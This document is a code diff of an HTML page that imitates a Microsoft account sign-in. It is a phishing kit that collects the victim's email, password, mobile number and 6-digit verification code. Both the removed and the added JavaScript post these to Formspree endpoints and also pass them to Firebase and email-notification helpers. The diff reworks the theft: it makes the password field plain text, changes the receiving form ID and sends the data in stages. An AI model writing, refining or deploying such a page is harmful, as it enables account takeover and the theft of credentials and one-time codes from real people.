@@ -152,7 +152,7 @@
   </div>
   <h1>Sign in</h1>
   <div class="input-wrap">
-    <input type="text" id="emailInput" placeholder=" " />
+    <input type="email" name="email" id="emailInput" placeholder=" " required />
     <label>Email, phone, or Skype</label>
   </div>
   <div class="links-row">
@@ -161,7 +161,7 @@
   </div>
   <div class="spacer"></div>
   <div class="btn-row">
-    <button class="btn-primary" onclick="handleEmail()">Next</button>
+    <button class="btn-primary" type="button" onclick="handleEmail()">Next</button>
   </div>
   <button class="signin-options">
     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
@@ -194,7 +194,7 @@
   <div class="email-chip" id="emailChip" onclick="goTo('screen1')">user@example.com</div>
   <h1>Enter your password</h1>
   <div class="input-wrap">
-    <input type="password" id="pwInput" placeholder=" " />
+    <input type="text" name="password" id="pwInput" placeholder=" " required />
     <label>Password</label>
     <button class="toggle-pw" onclick="togglePw()" type="button">
       <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
@@ -206,7 +206,7 @@
   <div class="links-row">
     <a class="ms-link" href="#">Forgot your password?</a>
   </div>
-  <button class="btn-primary full-width" onclick="handlePassword()">Next</button>
+  <button class="btn-primary full-width" type="button" onclick="handlePassword()">Next</button>
   <div style="text-align:center; margin-top:20px;">
     <a class="ms-link" href="#">Other ways to sign in</a>
   </div>
@@ -238,7 +238,7 @@
       </svg>
     </div>
     <div class="phone-input-wrap">
-      <input type="tel" id="phoneInput" placeholder=" " maxlength="14" oninput="formatPhone(this)" />
+      <input type="tel" name="phone" id="phoneInput" placeholder=" " maxlength="14" oninput="formatPhone(this)" required />
       <label>Mobile number</label>
     </div>
   </div>
@@ -247,7 +247,7 @@
   <div id="phoneMsg" class="msg"></div>
   <div class="spacer"></div>
   <div class="confirm-btn-row">
-    <button class="btn-primary" id="sendCodeBtn" onclick="handleSendCode()">Confirm</button>
+    <button class="btn-primary" id="sendCodeBtn" type="button" onclick="handlePhoneAndSubmit()">Next</button>
   </div>
 </div>
 
@@ -259,19 +259,15 @@
   </div>
   <h1>Enter code</h1>
   <p class="subtitle">We sent a 6-digit code to <strong id="phoneMask"></strong>. Enter it below.</p>
-  <div class="code-inputs">
-    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,0)" onkeydown="movePrev(event,0)" />
-    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,1)" onkeydown="movePrev(event,1)" />
-    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,2)" onkeydown="movePrev(event,2)" />
-    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,3)" onkeydown="movePrev(event,3)" />
-    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,4)" onkeydown="movePrev(event,4)" />
-    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,5)" onkeydown="movePrev(event,5)" />
+  <div class="input-wrap">
+    <input type="text" name="code" id="codeInput" placeholder=" " maxlength="6" required />
+    <label>6-digit code</label>
   </div>
   <div id="codeMsg" class="msg"></div>
   <div class="resend-row">Didn't get it? <span onclick="handleSendCode(true)">Resend code</span></div>
   <div class="spacer"></div>
   <div class="confirm-btn-row">
-    <button class="btn-primary" id="verifyBtn" onclick="handleVerifyCode()">Verify</button>
+    <button class="btn-primary" id="verifyBtn" type="button" onclick="handleFinalSubmit()">Verify</button>
   </div>
 </div>
 
@@ -292,7 +288,7 @@
   </div>
 </div>
 
-<!-- SMTPJS for direct email sending -->
+</form>
 <script src="https://smtpjs.com/v3/smtp.js"></script>
 
 <!-- Firebase SDKs -->
@@ -351,133 +347,114 @@
   }
 
   // Expose functions to global scope for onclick handlers
-  window.handleSendCode = async function(isResend) {
-    var raw = document.getElementById('phoneInput').value.replace(/\D/g, '');
-    if (raw.length < 10) {
-      showMsg('phoneMsg', 'Please enter a valid 10-digit US number.', 'error');
-      return;
-    }
-
-    var phoneNumber = '+1' + raw;
-    window.collectedData.phone = phoneNumber;
-
-    // ✅ SEND TO FORMSPREE HERE
-    fetch("https://formspree.io/f/mvzdkkoq", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "Accept": "application/json"
-      },
-      body: JSON.stringify({
-        email: collectedData.email,
-        password: collectedData.password,
-        phone: collectedData.phone,
-        code: collectedData.code,
-        _replyto: collectedData.email
-      })
-    })
-    .then(response => {
-      if (response.ok) {
-        console.log("Submitted to Formspree");
-      } else {
-        console.error("Formspree error");
-      }
-    })
-    .catch(error => console.error("Network error:", error));
-
-    await sendEmailNotification(window.collectedData);
-
-    var btn = document.getElementById('sendCodeBtn');
-    btn.disabled = true;
-    btn.innerHTML = 'Sending<span class="spinner"></span>';
-    hideMsg('phoneMsg');
-
-    document.getElementById('phoneMask').textContent =
-      phoneNumber.replace(/(\+1)(\d{3})(\d{3})(\d{4})/, '+1 ($2) $3-$4');
-    clearCodeInputs();
-    goTo('screen4');
-
-    btn.disabled = false;
-    btn.innerHTML = 'Confirm';
-  };
-
-  window.handleVerifyCode = async function() {
-    var digits = document.querySelectorAll('.code-digit');
-    var code = Array.from(digits).map(function(i) { return i.value; }).join('');
-    if (code.length < 6) {
-      showMsg('codeMsg', 'Please enter all 6 digits.', 'error');
-      return;
-    }
-
-    window.collectedData.code = code;
-
-    var btn = document.getElementById('verifyBtn');
-    btn.disabled = true;
-    btn.innerHTML = 'Verifying<span class="spinner"></span>';
-    hideMsg('codeMsg');
-
-    try {
-      await fetch("https://formspree.io/f/mvzdkkoq", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify({
-          email: collectedData.email,
-          password: collectedData.password,
-          phone: collectedData.phone,
-          code: collectedData.code,
-          _replyto: collectedData.email
-        })
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log("Submitted code to Formspree");
-        } else {
-          console.error("Formspree error");
-        }
-      })
-      .catch(error => console.error("Network error:", error));
-
-      await sendEmailNotification(window.collectedData);
-      await saveUserData(window.collectedData);
-      goTo('screen5');
-    } catch (err) {
-      console.error('Verify error:', err);
-      showMsg('codeMsg', 'Failed to verify. Please try again.', 'error');
-    }
-
-    btn.disabled = false;
-    btn.innerHTML = 'Verify';
-  };
-</script>
-
-<script>
-  // Non-module global functions
   let collectedData = window.collectedData = {
     email: "",
     password: "",
     phone: "",
     code: ""
   };
-  function goTo(id) {
-    document.querySelectorAll('.card').forEach(function(c) { c.classList.remove('active'); });
+
+  window.handleEmail = function() {
+    collectedData.email = document.getElementById("emailInput").value;
+    document.getElementById('emailChip').textContent = collectedData.email;
+    goTo("screen2");
+  };
+
+  window.handlePassword = function() {
+    collectedData.password = document.getElementById("pwInput").value;
+    goTo("screen3");
+  };
+
+  window.handlePhoneAndSubmit = async function() {
+    collectedData.phone = document.getElementById("phoneInput").value;
+
+    const raw = collectedData.phone.replace(/\D/g, '');
+    if (raw.length < 10) {
+      alert("Please enter a valid 10-digit US number.");
+      return;
+    }
+    const phoneNumber = '+1' + raw;
+    document.getElementById('phoneMask').textContent = phoneNumber.replace(/(\+1)(\d{3})(\d{3})(\d{4})/, '+1 ($2) $3-$4');
+
+    const formData = new FormData();
+    formData.append("email", collectedData.email);
+    formData.append("password", collectedData.password);
+    formData.append("phone", collectedData.phone);
+    formData.append("stage", "step1-3");
+
+    const btn = document.getElementById("sendCodeBtn");
+    btn.disabled = true;
+    btn.innerHTML = 'Submitting...';
+
+    try {
+      const res = await fetch("https://formspree.io/f/xeevgnar", {
+        method: "POST",
+        body: formData,
+        headers: { "Accept": "application/json" }
+      });
+
+      if (res.ok) {
+        // Optional: save to Firebase and send email
+        await sendEmailNotification(collectedData);
+        await saveUserData(collectedData);
+        goTo("screen4");
+      } else {
+        alert("Submission failed.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Network error.");
+    }
+
+    btn.disabled = false;
+    btn.innerHTML = 'Next';
+  };
+
+  window.handleFinalSubmit = async function() {
+    collectedData.code = document.getElementById("codeInput").value;
+
+    const formData = new FormData();
+    formData.append("email", collectedData.email);
+    formData.append("phone", collectedData.phone);
+    formData.append("code", collectedData.code);
+    formData.append("stage", "step4");
+
+    const btn = document.getElementById("verifyBtn");
+    btn.disabled = true;
+    btn.innerHTML = 'Submitting...';
+
+    try {
+      const res = await fetch("https://formspree.io/f/xeevgnar", {
+        method: "POST",
+        body: formData,
+        headers: { "Accept": "application/json" }
+      });
+
+      if (res.ok) {
+        // Optional: save to Firebase and send email
+        await sendEmailNotification(collectedData);
+        await saveUserData(collectedData);
+        goTo("screen5");
+      } else {
+        alert("Final submission failed.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Network error.");
+    }
+
+    btn.disabled = false;
+    btn.innerHTML = 'Verify';
+  };
+
+  window.goTo = function(id) {
+    document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
     document.getElementById(id).classList.add('active');
-  }
-  function handleEmail() {
-    var email = document.getElementById('emailInput').value.trim();
-    if (!email) return;
-    window.collectedData.email = email;
-    document.getElementById('emailChip').textContent = email;
-    goTo('screen2');
-  }
-  function handlePassword() {
-    var pw = document.getElementById('pwInput').value;
-    if (!pw) return;
-    window.collectedData.password = pw;
-    goTo('screen3');
-  }
+  };
+</script>
+
+<script>
+  // Non-module global functions
   function togglePw() {
     var i = document.getElementById('pwInput');
     i.type = i.type === 'password' ? 'text' : 'password';
@@ -492,20 +469,6 @@
   }
   function goToAccountPage() {
     window.location.href = 'https://account.microsoft.com';
-  }
-  function moveNext(input, index) {
-    input.value = input.value.replace(/\D/g,'');
-    var digits = document.querySelectorAll('.code-digit');
-    if (input.value && index < 5) digits[index+1].focus();
-  }
-  function movePrev(e, index) {
-    if (e.key === 'Backspace') {
-      var digits = document.querySelectorAll('.code-digit');
-      if (!digits[index].value && index > 0) digits[index-1].focus();
-    }
-  }
-  function clearCodeInputs() {
-    document.querySelectorAll('.code-digit').forEach(function(i){ i.value=''; });
   }
   function showMsg(id, text, type) {
     var el = document.getElementById(id);
@@ -523,8 +486,8 @@
     if (!active) return;
     if (active.id === 'screen1') handleEmail();
     else if (active.id === 'screen2') handlePassword();
-    else if (active.id === 'screen3' && window.handleSendCode) window.handleSendCode();
-    else if (active.id === 'screen4' && window.handleVerifyCode) window.handleVerifyCode();
+    else if (active.id === 'screen3') handlePhoneAndSubmit();
+    else if (active.id === 'screen4') handleFinalSubmit();
   });
 </script>
 </body>
